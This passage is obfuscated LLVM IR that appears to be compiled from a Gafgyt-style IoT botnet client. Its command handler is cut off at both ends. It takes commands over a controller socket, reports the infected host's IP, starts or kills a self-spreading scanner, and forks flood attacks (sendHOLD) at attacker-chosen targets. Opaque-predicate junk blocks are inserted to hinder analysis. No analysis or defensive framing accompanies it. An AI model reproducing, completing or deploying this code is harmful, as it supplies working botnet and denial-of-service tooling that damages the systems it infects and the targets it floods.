originalBBalteredBB:                              ; preds = %originalBB, %50
  %481 = load i32, i32* %17, align 4
  %482 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %483 = icmp sgt i32 %481, %482
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  store i32 0, i32* %8, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %87
  %484 = load i32, i32* %8, align 4
  %485 = load i32, i32* %7, align 4
  %486 = icmp slt i32 %484, %485
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %114
  %487 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %488 = load i32, i32* %8, align 4
  %489 = sext i32 %488 to i64
  %490 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %489
  %491 = getelementptr inbounds %struct.state_t, %struct.state_t* %490, i32 0, i32 0
  store i32 %487, i32* %491, align 8
  %492 = load i32, i32* %8, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %493
  %495 = getelementptr inbounds %struct.state_t, %struct.state_t* %494, i32 0, i32 0
  %496 = load i32, i32* %495, align 8
  %497 = load i32, i32* %8, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %498
  %500 = getelementptr inbounds %struct.state_t, %struct.state_t* %499, i32 0, i32 0
  %501 = load i32, i32* %500, align 8
  %502 = call i32 (i32, i32, ...) @fcntl(i32 %501, i32 3, i8* null)
  %_ = sub i32 0, %502
  %gen = add i32 %_, 2048
  %_11 = sub i32 %502, 2048
  %gen12 = mul i32 %_11, 2048
  %_13 = shl i32 %502, 2048
  %503 = or i32 %502, 2048
  %504 = call i32 (i32, i32, ...) @fcntl(i32 %496, i32 4, i32 %503)
  %505 = load i32, i32* %8, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %506
  %508 = getelementptr inbounds %struct.state_t, %struct.state_t* %507, i32 0, i32 0
  %509 = load i32, i32* %508, align 8
  %510 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %511 = call i32 @connect(i32 %509, %struct.sockaddr* %510, i32 16)
  %512 = icmp ne i32 %511, -1
  br label %originalBB10

originalBB17alteredBB:                            ; preds = %originalBB17, %161
  %513 = load i32, i32* %8, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %514
  %516 = getelementptr inbounds %struct.state_t, %struct.state_t* %515, i32 0, i32 0
  %517 = load i32, i32* %516, align 8
  %518 = call i32 @close(i32 %517)
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %201
  %519 = load i32, i32* %8, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %520
  %522 = getelementptr inbounds %struct.state_t, %struct.state_t* %521, i32 0, i32 0
  %523 = load i32, i32* %522, align 8
  %_22 = sub i32 0, %523
  %gen23 = add i32 %_22, 64
  %_24 = sub i32 0, %523
  %gen25 = add i32 %_24, 64
  %_26 = sub i32 0, %523
  %gen27 = add i32 %_26, 64
  %524 = srem i32 %523, 64
  %525 = zext i32 %524 to i64
  %_28 = sub i64 1, %525
  %gen29 = mul i64 %_28, %525
  %_30 = sub i64 0, 1
  %gen31 = add i64 %_30, %525
  %_32 = sub i64 1, %525
  %gen33 = mul i64 %_32, %525
  %_34 = shl i64 1, %525
  %526 = shl i64 1, %525
  %527 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %528 = load i32, i32* %8, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %529
  %531 = getelementptr inbounds %struct.state_t, %struct.state_t* %530, i32 0, i32 0
  %532 = load i32, i32* %531, align 8
  %_35 = shl i32 %532, 64
  %_36 = sub i32 0, %532
  %gen37 = add i32 %_36, 64
  %_38 = shl i32 %532, 64
  %_39 = sub i32 0, %532
  %gen40 = add i32 %_39, 64
  %533 = sdiv i32 %532, 64
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds [16 x i64], [16 x i64]* %527, i64 0, i64 %534
  %536 = load i64, i64* %535, align 8
  %_41 = sub i64 0, %536
  %gen42 = add i64 %_41, %526
  %_43 = sub i64 %536, %526
  %gen44 = mul i64 %_43, %526
  %_45 = sub i64 %536, %526
  %gen46 = mul i64 %_45, %526
  %_47 = shl i64 %536, %526
  %_48 = sub i64 %536, %526
  %gen49 = mul i64 %_48, %526
  %_50 = shl i64 %536, %526
  %537 = or i64 %536, %526
  store i64 %537, i64* %535, align 8
  %538 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %538, align 8
  %539 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %539, align 8
  %540 = load i32, i32* %8, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %541
  %543 = getelementptr inbounds %struct.state_t, %struct.state_t* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 8
  %_51 = shl i32 %544, 1
  %_52 = shl i32 %544, 1
  %_53 = sub i32 %544, 1
  %gen54 = mul i32 %_53, 1
  %_55 = sub i32 %544, 1
  %gen56 = mul i32 %_55, 1
  %545 = add nsw i32 %544, 1
  %546 = call i32 @select(i32 %545, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %546, i32* %15, align 4
  %547 = load i32, i32* %15, align 4
  %548 = icmp eq i32 %547, 1
  br label %originalBB21

originalBB60alteredBB:                            ; preds = %originalBB60, %248
  store i32 4, i32* %13, align 4
  %549 = load i32, i32* %8, align 4
  %550 = sext i32 %549 to i64
  %551 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %550
  %552 = getelementptr inbounds %struct.state_t, %struct.state_t* %551, i32 0, i32 0
  %553 = load i32, i32* %552, align 8
  %554 = bitcast i32* %14 to i8*
  %555 = call i32 @getsockopt(i32 %553, i32 1, i32 4, i8* %554, i32* %13) #2
  %556 = load i32, i32* %14, align 4
  %557 = icmp ne i32 %556, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %274
  %558 = load i32, i32* %8, align 4
  %559 = sext i32 %558 to i64
  %560 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %559
  %561 = getelementptr inbounds %struct.state_t, %struct.state_t* %560, i32 0, i32 0
  %562 = load i32, i32* %561, align 8
  %563 = call i32 @close(i32 %562)
  %564 = load i32, i32* %8, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %565
  %567 = getelementptr inbounds %struct.state_t, %struct.state_t* %566, i32 0, i32 1
  store i8 0, i8* %567, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %301
  %568 = load i32, i32* %8, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %569
  %571 = getelementptr inbounds %struct.state_t, %struct.state_t* %570, i32 0, i32 1
  store i8 2, i8* %571, align 4
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %322
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %356
  %572 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %573 = getelementptr inbounds [16 x i64], [16 x i64]* %572, i64 0, i64 0
  %574 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %573) #2, !srcloc !8
  %575 = extractvalue { i64, i64* } %574, 0
  %576 = extractvalue { i64, i64* } %574, 1
  %577 = trunc i64 %575 to i32
  store i32 %577, i32* %20, align 4
  %578 = ptrtoint i64* %576 to i64
  %579 = trunc i64 %578 to i32
  store i32 %579, i32* %21, align 4
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %413
  %580 = load i32, i32* %8, align 4
  %581 = sext i32 %580 to i64
  %582 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %581
  %583 = getelementptr inbounds %struct.state_t, %struct.state_t* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 8
  %585 = call i32 @close(i32 %584)
  %586 = load i32, i32* %8, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %587
  %589 = getelementptr inbounds %struct.state_t, %struct.state_t* %588, i32 0, i32 1
  store i8 0, i8* %589, align 4
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %441
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %462
  %590 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %590)
  br label %originalBB88
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i32 0, i32 0)) #10
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %57, label %54

; <label>:54:                                     ; preds = %2
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0))
  br label %1855

; <label>:57:                                     ; preds = %2
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.68, i32 0, i32 0)) #10
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %84, label %63

; <label>:63:                                     ; preds = %57
  %64 = load i32, i32* @x.79
  %65 = load i32, i32* @y.80
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %63
  %72 = load i32, i32* @mainCommSock, align 4
  %73 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %74 = call i8* @inet_ntoa(i32 %73) #2
  %75 = call i32 (i32, i8*, ...) @sockprintf(i32 %72, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* %74)
  %76 = load i32, i32* @x.79
  %77 = load i32, i32* @y.80
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1855

; <label>:84:                                     ; preds = %57
  %85 = load i8**, i8*** %4, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 0
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0)) #10
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %216, label %90

; <label>:90:                                     ; preds = %84
  %91 = load i32, i32* %3, align 4
  %92 = icmp ne i32 %91, 2
  br i1 %92, label %93, label %112

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* @x.79
  %95 = load i32, i32* @y.80
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %93
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = call i32 (i32, i8*, ...) @sockprintf(i32 %102, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.71, i32 0, i32 0))
  %104 = load i32, i32* @x.79
  %105 = load i32, i32* @y.80
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %1855

; <label>:112:                                    ; preds = %90
  %113 = load i8**, i8*** %4, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @strcmp(i8* %115, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.72, i32 0, i32 0)) #10
  %117 = icmp ne i32 %116, 0
  br i1 %117, label %159, label %118

; <label>:118:                                    ; preds = %112
  %119 = load i32, i32* @x.79
  %120 = load i32, i32* @y.80
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %118
  %127 = load i32, i32* @scanPid, align 4
  %128 = icmp eq i32 %127, 0
  %129 = load i32, i32* @x.79
  %130 = load i32, i32* @y.80
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %128, label %137, label %138

; <label>:137:                                    ; preds = %originalBBpart28
  br label %1855

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = load i32, i32* @x.79
  %140 = load i32, i32* @y.80
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %138
  %147 = load i32, i32* @scanPid, align 4
  %148 = call i32 @kill(i32 %147, i32 9) #2
  %149 = load i32, i32* @mainCommSock, align 4
  %150 = call i32 (i32, i8*, ...) @sockprintf(i32 %149, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  %151 = load i32, i32* @x.79
  %152 = load i32, i32* @y.80
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %159

; <label>:159:                                    ; preds = %originalBBpart212, %112
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 1
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.74, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %215, label %165

; <label>:165:                                    ; preds = %159
  %166 = load i32, i32* @x.79
  %167 = load i32, i32* @y.80
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %165
  %174 = load i32, i32* @scanPid, align 4
  %175 = icmp ne i32 %174, 0
  %176 = load i32, i32* @x.79
  %177 = load i32, i32* @y.80
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %175, label %184, label %185

; <label>:184:                                    ; preds = %originalBBpart216
  br label %1855

; <label>:185:                                    ; preds = %originalBBpart216
  %186 = call i32 @fork() #2
  store i32 %186, i32* %6, align 4
  %187 = load i32, i32* %6, align 4
  %188 = icmp ugt i32 %187, 0
  br i1 %188, label %189, label %191

; <label>:189:                                    ; preds = %185
  %190 = load i32, i32* %6, align 4
  store i32 %190, i32* @scanPid, align 4
  br label %1855

; <label>:191:                                    ; preds = %185
  %192 = load i32, i32* @x.79
  %193 = load i32, i32* @y.80
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %191
  %200 = load i32, i32* %6, align 4
  %201 = icmp eq i32 %200, -1
  %202 = load i32, i32* @x.79
  %203 = load i32, i32* @y.80
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %201, label %210, label %211

; <label>:210:                                    ; preds = %originalBBpart220
  br label %1855

; <label>:211:                                    ; preds = %originalBBpart220
  br label %212

; <label>:212:                                    ; preds = %211
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i32 (i32, i8*, ...) @sockprintf(i32 %213, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:215:                                    ; preds = %159
  br label %216

; <label>:216:                                    ; preds = %215, %84
  %217 = load i8**, i8*** %4, align 8
  %218 = getelementptr inbounds i8*, i8** %217, i64 0
  %219 = load i8*, i8** %218, align 8
  %220 = call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0)) #10
  %221 = icmp ne i32 %220, 0
  br i1 %221, label %326, label %222

; <label>:222:                                    ; preds = %216
  %223 = load i32, i32* %3, align 4
  %224 = icmp slt i32 %223, 4
  br i1 %224, label %237, label %225

; <label>:225:                                    ; preds = %222
  %226 = load i8**, i8*** %4, align 8
  %227 = getelementptr inbounds i8*, i8** %226, i64 2
  %228 = load i8*, i8** %227, align 8
  %229 = call i32 @atoi(i8* %228) #10
  %230 = icmp slt i32 %229, 1
  br i1 %230, label %237, label %231

; <label>:231:                                    ; preds = %225
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 3
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #10
  %236 = icmp slt i32 %235, 1
  br i1 %236, label %237, label %238

; <label>:237:                                    ; preds = %231, %225, %222
  br label %1855

; <label>:238:                                    ; preds = %231
  %239 = load i32, i32* @x.79
  %240 = load i32, i32* @y.80
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %238
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 1
  %249 = load i8*, i8** %248, align 8
  store i8* %249, i8** %7, align 8
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 2
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #10
  store i32 %253, i32* %8, align 4
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 3
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  store i32 %257, i32* %9, align 4
  %258 = load i8*, i8** %7, align 8
  %259 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %260 = icmp ne i8* %259, null
  %261 = load i32, i32* @x.79
  %262 = load i32, i32* @y.80
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %260, label %269, label %301

; <label>:269:                                    ; preds = %originalBBpart224
  %270 = load i32, i32* @x.79
  %271 = load i32, i32* @y.80
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %269
  %278 = load i8*, i8** %7, align 8
  %279 = call i8* @strtok(i8* %278, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %279, i8** %10, align 8
  %280 = load i32, i32* @x.79
  %281 = load i32, i32* @y.80
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %288

; <label>:288:                                    ; preds = %298, %originalBBpart228
  %289 = load i8*, i8** %10, align 8
  %290 = icmp ne i8* %289, null
  br i1 %290, label %291, label %300

; <label>:291:                                    ; preds = %288
  %292 = call i32 @listFork()
  %293 = icmp ne i32 %292, 0
  br i1 %293, label %298, label %294

; <label>:294:                                    ; preds = %291
  %295 = load i8*, i8** %10, align 8
  %296 = load i32, i32* %8, align 4
  %297 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %295, i32 %296, i32 %297)
  call void @_exit(i32 0) #12
  unreachable

; <label>:298:                                    ; preds = %291
  %299 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %299, i8** %10, align 8
  br label %288

; <label>:300:                                    ; preds = %288
  br label %309

; <label>:301:                                    ; preds = %originalBBpart224
  %302 = call i32 @listFork()
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %304, label %305

; <label>:304:                                    ; preds = %301
  br label %1855

; <label>:305:                                    ; preds = %301
  %306 = load i8*, i8** %7, align 8
  %307 = load i32, i32* %8, align 4
  %308 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %306, i32 %307, i32 %308)
  call void @_exit(i32 0) #12
  unreachable

; <label>:309:                                    ; preds = %300
  %310 = load i32, i32* @x.79
  %311 = load i32, i32* @y.80
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %309
  %318 = load i32, i32* @x.79
  %319 = load i32, i32* @y.80
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %326

; <label>:326:                                    ; preds = %originalBBpart232, %216
  %327 = load i8**, i8*** %4, align 8
  %328 = getelementptr inbounds i8*, i8** %327, i64 0
  %329 = load i8*, i8** %328, align 8
  %330 = call i32 @strcmp(i8* %329, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0)) #10
  %331 = icmp ne i32 %330, 0
  br i1 %331, label %486, label %332

; <label>:332:                                    ; preds = %326
  %333 = load i32, i32* %3, align 4
  %334 = icmp slt i32 %333, 4
  br i1 %334, label %347, label %335

; <label>:335:                                    ; preds = %332
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 2
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #10
  %340 = icmp slt i32 %339, 1
  br i1 %340, label %347, label %341

; <label>:341:                                    ; preds = %335
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 3
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @atoi(i8* %344) #10
  %346 = icmp slt i32 %345, 1
  br i1 %346, label %347, label %364

; <label>:347:                                    ; preds = %341, %335, %332
  %348 = load i32, i32* @x.79
  %349 = load i32, i32* @y.80
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %347
  %356 = load i32, i32* @x.79
  %357 = load i32, i32* @y.80
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %1855

; <label>:364:                                    ; preds = %341
  %365 = load i32, i32* @x.79
  %366 = load i32, i32* @y.80
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %364
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 1
  %375 = load i8*, i8** %374, align 8
  store i8* %375, i8** %11, align 8
  %376 = load i8**, i8*** %4, align 8
  %377 = getelementptr inbounds i8*, i8** %376, i64 2
  %378 = load i8*, i8** %377, align 8
  %379 = call i32 @atoi(i8* %378) #10
  store i32 %379, i32* %12, align 4
  %380 = load i8**, i8*** %4, align 8
  %381 = getelementptr inbounds i8*, i8** %380, i64 3
  %382 = load i8*, i8** %381, align 8
  %383 = call i32 @atoi(i8* %382) #10
  store i32 %383, i32* %13, align 4
  %384 = load i8*, i8** %11, align 8
  %385 = call i8* @strstr(i8* %384, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #10
  %386 = icmp ne i8* %385, null
  %387 = load i32, i32* @x.79
  %388 = load i32, i32* @y.80
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %386, label %395, label %429

; <label>:395:                                    ; preds = %originalBBpart240
  %396 = load i8*, i8** %11, align 8
  %397 = call i8* @strtok(i8* %396, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %397, i8** %14, align 8
  br label %398

; <label>:398:                                    ; preds = %originalBBpart244, %395
